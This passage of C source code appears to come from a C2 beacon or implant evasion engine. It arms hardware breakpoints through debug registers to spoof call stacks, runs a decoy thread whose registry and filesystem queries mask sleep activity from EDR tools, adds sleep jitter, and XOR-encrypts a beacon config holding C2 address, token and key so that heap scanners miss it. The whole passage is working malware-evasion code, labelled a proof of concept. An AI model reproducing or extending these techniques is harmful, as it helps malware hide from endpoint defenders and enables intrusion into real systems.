    if (!NT_SUCCESS(ctx->pNtSetCtx(GetCurrentThread(), &c))) return FALSE;
    ctx->hwbpTarget = addr;
    LOG("[P3] HWBP armed: DR0 → 0x%p", addr);
    return TRUE;
}

BOOL phantom_hwbp_clear(PHANTOM_CTX* ctx) {
    if (!ctx->pNtGetCtx || !ctx->pNtSetCtx) return FALSE;
    CONTEXT c = {0};
    c.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!NT_SUCCESS(ctx->pNtGetCtx(GetCurrentThread(), &c))) return FALSE;
    c.Dr0 = 0; c.Dr6 = 0;
    c.Dr7 &= ~(DWORD64)0x3;
    ctx->hwbpTarget = NULL;
    return NT_SUCCESS(ctx->pNtSetCtx(GetCurrentThread(), &c));
}

// ============================================================
//  P7: HWBP-Redirected Continuation
//
//  Arms HWBP DR1 on ntdll!RtlUserThreadStart.
//  When gadget rets to slot 48 (ntdll addr), CPU is about to
//  execute RtlUserThreadStart. HWBP fires BEFORE execution.
//  VEH handler redirects execution to real caller.
//
//  DR7 bit layout (x64):
//    Bit 0: L0 (DR0 local enable)    — used by P3
//    Bit 1: G0 (DR0 global enable)
//    Bit 2: L1 (DR1 local enable)    — used by P7
//    Bit 3: G1 (DR1 global enable)
//    Bits 16-19: DR0 condition+length — P3: 00 00 (execute, 1 byte)
//    Bits 20-23: DR1 condition+length — P7: 00 00 (execute, 1 byte)
//
//  For execute breakpoint: condition=00, length=00
// ============================================================
BOOL phantom_p7_arm_hwbp(PHANTOM_CTX* ctx, PVOID addr) {
    if (!ctx->pNtGetCtx || !ctx->pNtSetCtx || !addr) return FALSE;
    CONTEXT c = {0};
    c.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!NT_SUCCESS(ctx->pNtGetCtx(GetCurrentThread(), &c))) return FALSE;

    c.Dr1 = (DWORD64)addr;
    c.Dr7 |= (DWORD64)(1 << 2);       // L1 = 1 (local enable DR1)
    c.Dr7 &= ~(DWORD64)(0xF << 20);   // Clear DR1 condition/length (execute, 1 byte)

    if (!NT_SUCCESS(ctx->pNtSetCtx(GetCurrentThread(), &c))) return FALSE;
    return TRUE;
}

BOOL phantom_p7_clear_hwbp(PHANTOM_CTX* ctx) {
    if (!ctx->pNtGetCtx || !ctx->pNtSetCtx) return FALSE;
    CONTEXT c = {0};
    c.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!NT_SUCCESS(ctx->pNtGetCtx(GetCurrentThread(), &c))) return FALSE;
    // Original behavior: clear DR1 + L1. See STABILITY NOTE above the P7
    // VEH handler for why the I-CR1 re-arm fix was reverted.
    c.Dr1 = 0;
    c.Dr7 &= ~(DWORD64)(0x1 << 2);  // Clear L1
    return NT_SUCCESS(ctx->pNtSetCtx(GetCurrentThread(), &c));
}

// ============================================================
//  PILLAR 4 — PERSISTENT DECOY THREAD
//
//  FIX: Removed Sleep() fallback. Now ALWAYS uses direct
//  NtDelayExecution. Decoy stack will show:
//    ntdll!NtDelayExecution
//    phantom_eng.exe!decoy_worker  ← visible (decoy is less critical)
//    ntdll!RtlUserThreadStart
//    kernel32!BaseThreadInitThunk
//
//  Decoy is behavioral noise — not the main beacon thread.
//  Its stack visibility is less critical than the main thread.
// ============================================================

// ─── Decoy State Machine (v2 — continuous activity) ──
//
// OLD (broken): hDecoyRun = auto-reset event
//   phantom_decoy_start() → SetEvent (pulse, consumed once)
//   Decoy does 1 iteration → checks hDecoyRun → WAIT_TIMEOUT → breaks
//   → back to dormant wait → STUCK for rest of sleep
//
// NEW (fixed): hDecoyRun = MANUAL-reset event
//   phantom_decoy_start() → SetEvent (turn ON, stays on)
//   Decoy loops continuously doing activity while hDecoyRun is signaled
//   phantom_decoy_pause()  → ResetEvent (turn OFF)
//   Decoy exits inner loop → back to dormant wait
//
// This keeps decoy ACTIVE throughout the entire sleep duration,
// not just one iteration. Process Hacker will show decoy doing
// registry/FS/memory queries DURING sleep, not stuck in wait.
static DWORD WINAPI decoy_worker(LPVOID arg) {
    PHANTOM_CTX* ctx = (PHANTOM_CTX*)arg;
    HKEY  hk = NULL;
    DWORD dw, sz;
    BYTE  buf[128];
    WCHAR wp[MAX_PATH];
    MEMORYSTATUSEX ms;
    SYSTEM_INFO    si;

    HANDLE waits[2] = { ctx->hDecoyStop, ctx->hDecoyRun };

    for (;;) {
        // Wait until "running" mode is turned ON (or stop signal)
        // hDecoyRun is manual-reset: stays signaled until ResetEvent
        DWORD r = WaitForMultipleObjects(2, waits, FALSE, INFINITE);

        if (r == WAIT_OBJECT_0) break;      // hDecoyStop → exit
        if (r != WAIT_OBJECT_0 + 1) break;  // unexpected → exit

        // "Running" mode active — loop continuously doing activity
        // Exit conditions: hDecoyStop signaled, OR hDecoyRun reset
        for (;;) {
            // Check stop signal (highest priority)
            if (WaitForSingleObject(ctx->hDecoyStop, 0) != WAIT_TIMEOUT)
                goto decoy_exit;

            // Check if "running" mode still active
            // hDecoyRun is manual-reset: if signaled, returns WAIT_OBJECT_0
            if (WaitForSingleObject(ctx->hDecoyRun, 0) == WAIT_TIMEOUT)
                break;  // running mode turned off → back to outer wait

            // ── Activity Phase 1: Registry queries ──
            // Most common real-app activity — looks like normal system polling
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                    0, KEY_READ, &hk) == ERROR_SUCCESS) {
                sz = sizeof(buf);
                RegQueryValueExA(hk, "ProductName", NULL, &dw, buf, &sz);
                RegQueryValueExA(hk, "InstallDate", NULL, &dw, buf, &sz);
                RegQueryValueExA(hk, "BuildLab",    NULL, &dw, buf, &sz);
                RegCloseKey(hk); hk = NULL;
            }

            // ── Activity Phase 2: Filesystem queries ──
            // Common in real apps — system paths, temp dir, file attrs
            GetSystemDirectoryW(wp, MAX_PATH);
            GetFileAttributesW(wp);
            GetTempPathW(MAX_PATH, wp);
            GetFileAttributesW(wp);
            GetWindowsDirectoryW(wp, MAX_PATH);
            GetFileAttributesW(wp);

            // ── Activity Phase 3: System info polling ──
            // Memory status + system info — normal for monitoring apps
            ms.dwLength = sizeof(ms);
            GlobalMemoryStatusEx(&ms);
            GetSystemInfo(&si);
            GetTickCount();  // cheap, common call

            // ── Short delay between activity bursts ──
            // DIRECT NtDelayExecution — NOT spoofed!
            //
            // CRITICAL: Decoy must NOT use phantom_spoofed_delay because
            // g_savedRealRsp is a global shared between threads. If decoy
            // overwrites it while main thread is sleeping, main thread
            // restores WRONG RSP on wake → CRASH.
            //
            // Decoy is behavioral noise — its stack visibility is less
            // critical than the main beacon thread. Direct NtDelay is
            // sufficient (still no SleepEx/KernelBase frames).
            FN_NtDelayExecution fn = get_ntdelay();
            if (fn) {
                LARGE_INTEGER iv;
                iv.QuadPart = -(LONGLONG)(200 + rand() % 400) * 10000LL;
                fn(FALSE, &iv);   // non-alertable — decoy doesn't need APC
            }
            // Loop continues — activity runs continuously during sleep
        }
    }

decoy_exit:
    if (hk) RegCloseKey(hk);
    return 0;
}

// phantom_decoy_init: create persistent decoy thread
// hDecoyRun is now MANUAL-RESET (was auto-reset)
BOOL phantom_decoy_init(PHANTOM_CTX* ctx) {
    // hDecoyRun: MANUAL-reset — SetEvent turns ON, ResetEvent turns OFF
    // This allows continuous activity during sleep (not just 1 iteration)
    ctx->hDecoyRun  = CreateEventA(NULL, TRUE,  FALSE, NULL);  // manual-reset
    ctx->hDecoyStop = CreateEventA(NULL, TRUE,  FALSE, NULL);  // manual-reset
    if (!ctx->hDecoyRun || !ctx->hDecoyStop) return FALSE;

    NTSTATUS s = ctx->pNtCreateThread(
        &ctx->hDecoyThread, THREAD_ALL_ACCESS, NULL,
        GetCurrentProcess(), (PVOID)decoy_worker, ctx,
        0, 0, 0, 0, NULL
    );
    if (!NT_SUCCESS(s))
        ctx->hDecoyThread = CreateThread(NULL, 0, decoy_worker, ctx, 0, NULL);

    if (!ctx->hDecoyThread) {
        CloseHandle(ctx->hDecoyRun);  ctx->hDecoyRun  = NULL;
        CloseHandle(ctx->hDecoyStop); ctx->hDecoyStop = NULL;
        return FALSE;
    }
    LOG("[P4] Persistent decoy thread started (continuous activity mode)");
    return TRUE;
}

// phantom_decoy_start: turn ON running mode (called before sleep)
void phantom_decoy_start(PHANTOM_CTX* ctx) {
    if (ctx->hDecoyRun)
        SetEvent(ctx->hDecoyRun);   // turn ON — stays on until ResetEvent
}

// phantom_decoy_pause: turn OFF running mode (called after wake)
void phantom_decoy_pause(PHANTOM_CTX* ctx) {
    if (ctx->hDecoyRun)
        ResetEvent(ctx->hDecoyRun);  // turn OFF — decoy goes dormant
}

void phantom_decoy_stop(PHANTOM_CTX* ctx) {
    phantom_decoy_pause(ctx);
}

void phantom_decoy_destroy(PHANTOM_CTX* ctx) {
    if (ctx->hDecoyStop)   { SetEvent(ctx->hDecoyStop); }
    if (ctx->hDecoyThread) {
        WaitForSingleObject(ctx->hDecoyThread, 2000);
        CloseHandle(ctx->hDecoyThread); ctx->hDecoyThread = NULL;
    }
    if (ctx->hDecoyStop)   { CloseHandle(ctx->hDecoyStop); ctx->hDecoyStop = NULL; }
    if (ctx->hDecoyRun)    { CloseHandle(ctx->hDecoyRun);  ctx->hDecoyRun  = NULL; }
    LOG("[P4] Decoy thread destroyed");
}

// ============================================================
//  JITTER
// ============================================================
DWORD phantom_jitter(DWORD base, DWORD pct) {
    if (!pct || pct > 50) return base;
    DWORD max_j = (base * pct) / 100;
    return base + (max_j ? (rand() % max_j) : 0);
}

// ============================================================
//  PILLAR 6 — HEAP ENCRYPTION
//
//  Concept: Beacon stores sensitive data on heap (C2 server address,
//  encryption keys, command buffers, task results). EDR heap scanner
//  walks all heap allocations during sleep looking for suspicious
//  strings/patterns.
//
//  Solution: Before sleep, XOR-encrypt the beacon config buffer.
//  After wake, XOR-decrypt to restore. EDR scanner sees encrypted
//  garbage — no readable strings, no recognizable patterns.
//
//  This is a simplified PoC — encrypts one config buffer.
//  Production version would use HeapWalk() to enumerate ALL
//  beacon-owned heap allocations and encrypt each one.
//
//  XOR key: Simple single-byte XOR (0x55) for PoC.
//  Production: Use AES-256 or ChaCha20 with random key.
// ============================================================

// XOR key for encryption (simple PoC — real impl would use AES/ChaCha20)
#define HEAP_XOR_KEY 0x55

// Init: allocate config buffer on process heap + fill with simulated data
BOOL phantom_init_heap_protect(void) {
    g_pBeaconConfig = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_configSize);
    if (!g_pBeaconConfig) {
        LOG("[P6] Heap alloc failed for beacon config");
        return FALSE;
    }

    // Fill with simulated C2 config (what EDR would scan for)
    // In real beacon: server address, auth token, encryption keys, etc.
    const char* c2server  = "C2_SERVER=10.0.0.1:8443";
    const char* authToken = "AUTH_TOKEN=b3Blbi1zZXNhbWUtb2F1dGgtdG9rZW4=";
    const char* aesKey    = "AES_KEY=0123456789ABCDEF0123456789ABCDEF";
    const char* userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Beacon/1.0";

    PUCHAR p = (PUCHAR)g_pBeaconConfig;
    memcpy(p,        c2server,  strlen(c2server));
    memcpy(p + 256,  authToken, strlen(authToken));
    memcpy(p + 512,  aesKey,    strlen(aesKey));
    memcpy(p + 768,  userAgent, strlen(userAgent));

    g_heapEncrypted = FALSE;
    LOG("[P6] Beacon config allocated @ 0x%p (%zu bytes) — filled with C2 data",
        g_pBeaconConfig, g_configSize);
    LOG("[P6]   EDR heap scan would find: C2_SERVER, AUTH_TOKEN, AES_KEY, etc.");
    return TRUE;
}

// Encrypt: XOR all bytes in config buffer
void phantom_encrypt_heap(void) {
    if (!g_pBeaconConfig || g_heapEncrypted) return;

    PUCHAR p = (PUCHAR)g_pBeaconConfig;
    for (SIZE_T i = 0; i < g_configSize; i++) {
        p[i] ^= HEAP_XOR_KEY;
    }

    g_heapEncrypted = TRUE;
    LOG("[P6] Heap config ENCRYPTED — %zu bytes XOR'd with 0x%02X",
        g_configSize, HEAP_XOR_KEY);
    LOG("[P6]   EDR heap scan now sees: encrypted garbage (no readable strings)");
}

// Decrypt: XOR all bytes back (XOR is self-inverse)
void phantom_decrypt_heap(void) {
    if (!g_pBeaconConfig || !g_heapEncrypted) return;

    PUCHAR p = (PUCHAR)g_pBeaconConfig;
    for (SIZE_T i = 0; i < g_configSize; i++) {
        p[i] ^= HEAP_XOR_KEY;
    }

    g_heapEncrypted = FALSE;
    LOG("[P6] Heap config DECRYPTED — C2 data readable again");
}

// Destroy: free config buffer
void phantom_destroy_heap_protect(void) {
    if (g_pBeaconConfig) {
        // Zero before free (don't leave plaintext in freed memory)
        memset(g_pBeaconConfig, 0, g_configSize);
        HeapFree(GetProcessHeap(), 0, g_pBeaconConfig);
        g_pBeaconConfig = NULL;
    }
    g_heapEncrypted = FALSE;
    LOG("[P6] Beacon config freed + zeroed");
}
